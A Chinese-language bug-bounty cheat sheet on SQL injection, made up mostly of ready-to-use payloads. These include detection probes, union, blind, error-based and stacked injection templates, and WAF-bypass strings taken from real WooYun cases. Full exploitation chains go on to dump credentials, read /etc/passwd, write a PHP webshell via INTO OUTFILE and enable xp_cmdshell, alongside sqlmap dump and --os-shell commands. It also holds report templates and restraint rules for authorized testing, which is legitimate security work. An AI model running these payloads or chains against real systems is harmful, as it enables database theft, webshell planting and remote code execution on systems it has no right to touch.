# SQL 注入

> 视角：黑盒，目标是从 0 到拿数据 / 拿权限

## 1. 一句话说清

SQLi = 把"数据"提升为"SQL 指令"。
SRC 价值：能拖库或读 admin hash 的 SQLi → P1，DBA 权限或 RCE 升级 → P0。
WooYun 27,732 案例中，**66% 在登录框、64% 在搜索、60% 在 POST 表单、26% 在 HTTP Header**。

---

## 2. 高频入口点（27,732 案例统计）

### 2.1 高频危险参数名（按频次）

```python
# 数字型 ID 类（最常见）
'id': 56,           'sort_id': 37,      'stid': 32,
'fid': 8,           'hotelid': 11,      'areainfoid': 8,

# 认证（高危）
'username': 33,     'password': 30,     'userpwd': 11,

# 业务
'type': 18,         'action': 7,        'page': 4,
'name': 30,

# ASP.NET 特有（.NET 应用必查）
'__viewstate': 58,  '__eventvalidation': 56,
'__eventargument': 52, '__eventtarget': 41,
```

### 2.2 注入向量分布

| 向量 | 占比 | 典型 |
|------|------|------|
| 登录框 | 66% | 用户名/密码字段拼接 |
| 搜索框 | 64% | LIKE 模糊匹配 |
| POST 参数 | 60% | 表单提交 |
| HTTP Header | 26% | User-Agent / Referer / X-Forwarded-For |
| GET 参数 | 24% | URL |
| Cookie | 12% | 会话标识 |

### 2.3 URL 模式

```
# 列表 / 详情
/news/detail.php?id=1
/product/view.aspx?pid=123
/article.asp?aid=456

# 搜索
/search.php?keyword=test
/list.aspx?stid=5882&pageid=2

# 后台
/admin/login.aspx
/manage/user.php?action=edit&uid=1

# API
/api/getData.php?type=user&id=1
```

### 2.4 后端类型快表

| 后缀 | 数据库 | 报错关键字 |
|------|--------|----------|
| `.php` | MySQL | `You have an error in your SQL syntax` |
| `.aspx` | MSSQL / Oracle | `Unclosed quotation mark` / `Microsoft OLE DB` |
| `.asp` | Access / MSSQL | `Microsoft JET Database Engine` |
| `.jsp` / `.do` / `.action` | Oracle / MySQL | `ORA-00942` / SQL exception |
| 现代 API（JSON） | 任意 ORM | 看响应字段 / 后端框架 |

---

## 3. 探测手法

### 3.1 注入点确认

```sql
id=1'                 # 报错？
id=1"
id=1)
id=1;
id=1--
id=1#
id=1 AND 1=1          # 正常
id=1 AND 1=2          # 异常
id=1*1                # 数字型用算术
id=1-0
id=1 AND sleep(3)     # 时间盲探
```

观察：
- 响应内容差异（页面变化）
- 响应长度差异
- 响应时间差异（盲注）
- 错误信息（暴库类型）

### 3.2 数据库指纹

```sql
-- MySQL
SELECT version()                                    → 5.7.x / 8.x
SELECT @@version
SELECT user(), database()
AND sleep(5)
AND benchmark(10000000, sha1('a'))

-- MSSQL
SELECT @@version
SELECT db_name(), system_user
WAITFOR DELAY '0:0:5'

-- Oracle
SELECT banner FROM v$version WHERE rownum=1
SELECT user FROM dual
AND dbms_pipe.receive_message('a',5)=1

-- PostgreSQL
SELECT version()
SELECT current_database(), current_user
SELECT pg_sleep(5)

-- SQLite
SELECT sqlite_version()

-- Access
SELECT TOP 1 1 FROM MSysObjects     # 特有，无 #/-- 注释
```

### 3.3 各注入技术 payload 模板

#### 布尔盲

```
id=1 AND 1=1
id=1 AND 1=2

id=1' AND '1'='1
id=1' AND '1'='2

id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'

# RLIKE / REGEXP
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### 时间盲

```
# MySQL
id=1 AND sleep(5)
id=1 AND IF(1=1,sleep(5),0)
id=(SELECT(CASE WHEN(1=1) THEN SLEEP(5) ELSE 1 END))

# 双层延时（绕过单层 sleep 检测）
id=(select(2)from(select(sleep(8)))v)/*'+(select(0)from(select(sleep(0)))v)+'

# MSSQL
id=1; WAITFOR DELAY '0:0:5'--

# Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1

# PostgreSQL
id=1 AND pg_sleep(5)
```

#### 联合查询

```
# 探列数
id=1 ORDER BY 1--   ... ORDER BY N--（报错时 N-1 为列数）

# 联合
id=-1 UNION SELECT 1,2,3,4,5--
id=-1 UNION SELECT null,null,null--

# 数据
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### 报错注入

```
# MySQL extractvalue
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))

# MySQL updatexml
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

# MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

# MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
```

#### 堆叠（MSSQL / PostgreSQL）

```
id=1; SELECT pg_sleep(5)--
id=1; EXEC xp_cmdshell 'whoami'--
```

### 3.4 完整利用链 Cheatsheet

#### MySQL

```sql
-- Step 1
union select 1,database(),version(),user(),5--

-- Step 2: 全部库
union select 1,group_concat(schema_name),3 from information_schema.schemata--

-- Step 3: 当前库的表
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

-- Step 4: 列名
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--

-- Step 5: 数据
union select 1,group_concat(username,0x3a,password),3 from users--

-- Step 6: 文件读（FILE 权限）
union select 1,load_file('/etc/passwd'),3--

-- Step 7: webshell（FILE + 写权限 + 路径已知）
union select 1,'<?php @system($_POST[c]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,name,3 from syscolumns where id=object_id('users')--

-- 命令执行（sa）
; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC master..xp_cmdshell 'whoami'--
```

#### Oracle

```sql
union select banner,null from v$version where rownum=1--
union select user,null from dual--
union select table_name,null from all_tables where rownum<=10--
```

### 3.5 工具

```bash
# sqlmap（最常用）
sqlmap -u "https://target/page.php?id=1" --batch
sqlmap -r request.txt --batch                # 用 Burp 保存的请求
sqlmap -u "..." --dbs                        # 列库
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T users --columns
sqlmap -u "..." -D dbname -T users -C "username,password" --dump --start 1 --stop 3   # 限制取 3 条
sqlmap -u "..." --tamper=between,space2comment,charencode    # 多 tamper 串联
sqlmap -u "..." --time-sec=10 --technique=T   # 仅时间盲
sqlmap -u "..." --os-shell                    # 仅在授权场景
```

---

## 4. Bypass 矩阵（详见 methodology/02-bypass-toolkit.md）

| 维度 | Payload |
|------|---------|
| 关键字 | `UnIoN SeLeCt` / `un/**/ion sel/**/ect` / `/*!50000union*//*!50000select*/` |
| 空格 | `/**/` / `%09` / `%0a` / 括号 / `+` |
| 引号 | `0x...` 十六进制 / `char()` / `%df%27`（GBK 宽字节） |
| 函数 | `mid()`/`substr()`/`substring()`/`left()` 互换；`if()`/`case when` |
| 等号 | `LIKE`/`REGEXP`/`IN(1)`/`BETWEEN` |
| 注释 | `--` / `#` / `/**/` / `;%00` |
| 二次注入 | 先存（含 `'`）再触发查询 |
| 入口换 | Header / Cookie / X-Forwarded-For 注入 |

### sqlmap tamper 速记

```
between, space2comment, charencode, bluecoat, modsecurityzeroversioned,
versionedmorekeywords, randomcase, percentage, equaltolike, apostrophemask,
space2hash, space2mssqlblank, space2plus
```

### 真实 WooYun 绕过 payload

```
# 内联注释（DeDeCMS 经典绕过）
aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\'`

# 双层 sleep（wooyun-2015-0114228）
hotelid=(select(2)from(select(sleep(8)))v)
hotelid=(SELECT (CASE WHEN (8177=8177) THEN SLEEP(10) ELSE 8177*(SELECT 8177 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))

# 报错链（wooyun-2015-0157074）
txtuser=-7004' OR 6089=6089#
txtuser=-8086' OR 1 GROUP BY CONCAT(0x716b767171,(SELECT (CASE WHEN (5800=5800) THEN 1 ELSE 0 END)),0x7171627171,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

---

## 5. 利用提权 / 横向

```
SQLi
  → 拿 admin hash → 离线破解（rockyou.txt） → 登录后台
  → 拿全表数据
  → 拿 DB 版本 → 找已知 CVE
  → DBA 权限 → load_file / outfile → 任意文件读写 → Webshell → RCE
  → MSSQL xp_cmdshell → RCE
  → 堆叠注入 + xp_cmdshell（MSSQL）
  → Oracle UTL_HTTP.request → SSRF
```

参考案例：wooyun-2015-0157074 广州嘉航软件，DBA 权限 + root hash + 512 用户密码。

---

## 6. 真实案例指纹

| 类型 | wooyun ID | Payload 特征 |
|------|----------|------------|
| 报错 + 布尔 | wooyun-2015-0157074 | `txtuser=-7004' OR 6089=6089#` |
| 双层时间盲 | wooyun-2015-0114228 | `(select(2)from(select(sleep(8)))v)` |
| 内联注释 | wooyun-2015-0113920 | `/*!50000union*//*!50000select*/` |
| ASP.NET ViewState | 多 | 改 `__VIEWSTATE` 触发反序列化 |
| Header 注入 | 多 | `User-Agent: 1' AND ...` |

通用指纹：
- 错误信息含 `MySQL syntax error` / `near` / `unclosed quotation` / `ORA-00942` → 数据库类型确认
- 同参数 `?id=1 AND sleep(5)` 5s 延时 + `?id=1 AND sleep(0)` 0s = 100% 时间盲
- `?id=1` 与 `?id=2-1` 返回相同 = 数字型，可注入

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. **基线**：`?id=1` 正常响应
2. **注入证明**：报错 / 布尔差异 / 时间差（≥5s 稳定）
3. **数据证据**：`version()`、`current_database()`、第一行 admin 用户名（脱敏）
4. **影响升级链**：能读 admin hash？能读其他库？能 outfile？

### 7.2 PoC 模板

```http
GET /api/search?keyword=test' AND (SELECT SLEEP(5))-- - HTTP/1.1
Host: target.com

→ 响应时间：5.234s

GET /api/search?keyword=test' AND (SELECT SLEEP(0))-- - HTTP/1.1
→ 响应时间：0.087s

# 5 次复现
1: 5.21s vs 0.09s
2: 5.18s vs 0.07s
3: 5.31s vs 0.08s
4: 5.22s vs 0.09s
5: 5.19s vs 0.08s

# 数据证明
GET /api/search?keyword=test' UNION SELECT 1,version(),3-- -

→ 响应：[{"id":1,"name":"5.7.34-log","desc":3}]
```

### 7.3 sqlmap log 附件

```
保留 sqlmap 的 -v 3 输出 log，证明工具识别为可注入。
日志含：
  [INFO] testing connection to the target URL
  [INFO] testing if the target URL content is stable
  [INFO] target URL content is stable
  ...
  [INFO] (parameter) is vulnerable. Do you want to keep testing the others (if any)? [y/N]
```

### 7.4 CVSS

```
未授权 SQLi（可拖库）   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
认证 SQLi              CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
SQLi → RCE (DBA)       = 9.8
仅时间盲 / 不可拖     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
```

### 7.5 影响段

```
通过 /api/search 接口的 keyword 参数，攻击者可注入 SQL 指令，
基于时间的盲注稳定 5 秒延时差异（5/5 复现）。

通过 UNION SELECT 已确认：
1. 数据库版本 5.7.34-log（MySQL）
2. 当前库 prod_main
3. users 表存在 admin 用户（用户名前缀 ad****）

我未尝试拖出完整数据 / 读 admin 密码 hash / outfile 写文件。
```

---

## 8. 不要做的事

- **禁**：用 sqlmap 全量 dump 表（即使能）。`--start 1 --stop 3` 拿 3 条样本足够。
- **禁**：实际 outfile 写文件 / xp_cmdshell 执行命令。"证明能"即可。
- **禁**：报告中粘贴他人完整 PII。脱敏到只剩前 2 + 后 2 字符。
- **禁**：用读到的 admin hash 离线破解后实际登录目标后台。
- **禁**：堆叠 DROP / DELETE / UPDATE 语句。仅 SELECT。
- **限**：sqlmap 默认线程偏激进，`--threads=1 --delay=1`。
- **报告中**：admin 密码 hash 写前 8 字符 + sha256 of full hash。

## H1 真实案例

_共 147 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | Starbucks | [SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database](https://hackerone.com/reports/531051) | SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database |
| Critical | — | GSA Bounty | [SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent](https://hackerone.com/reports/297478) | I've identified an SQL injection vulnerability in the website **labs.data.gov** that affects the endpoint `/dashboard/datagov/c… |
| Critical | 25000 usd | Valve | [SQL Injection in report_xml.php through countryFilter[] parameter](https://hackerone.com/reports/383127) | SQL Injection in report_xml.php through countryFilter[] parameter |
| Critical | 4500 usd | Eternal | [[www.zomato.com] SQLi - /php/██████████ - item_id](https://hackerone.com/reports/403616) | [www.zomato.com] SQLi - /php/██████████ - item_id |
| High | — | MTN Group | [SQL Injection on cookie parameter](https://hackerone.com/reports/761304) | Summary: Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang … |
| High | 4500 usd | Grab | [www.drivegrab.com SQL injection](https://hackerone.com/reports/273946) | Summary:** The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code. Description:… |
| Critical | 4134 usd | inDrive | [Blind SQL injection on id.indrive.com](https://hackerone.com/reports/2051931) | Summary: The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a q… |
| High | — | Acronis | [SQL Injection in agent-manager](https://hackerone.com/reports/962889) | 1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=15902… |
| Critical | — | Starbucks | [Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice](https://hackerone.com/reports/592400) | Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice |
| High | — | Starbucks | [Blind SQL Injection on starbucks.com.gt and WAF Bypass  :*](https://hackerone.com/reports/549355) | Blind SQL Injection on starbucks.com.gt and WAF Bypass :* |
| Critical | — | HackerOne | [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter](https://hackerone.com/reports/435066) | The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection |
| High | — | Automattic | [Sql injection on docs.atavist.com](https://hackerone.com/reports/1039315) | hello dear team I have found SQL injection on docs.atavist.com url:http://docs.atavist.com/reader_api/stories.php?limit=10&offs… |

**命中本类的 weakness 分布：**

- SQL Injection：140 条
- Uncategorized → 手工归类：2 条
- XML Injection：2 条
- LDAP Injection：2 条
- Blind SQL Injection：1 条
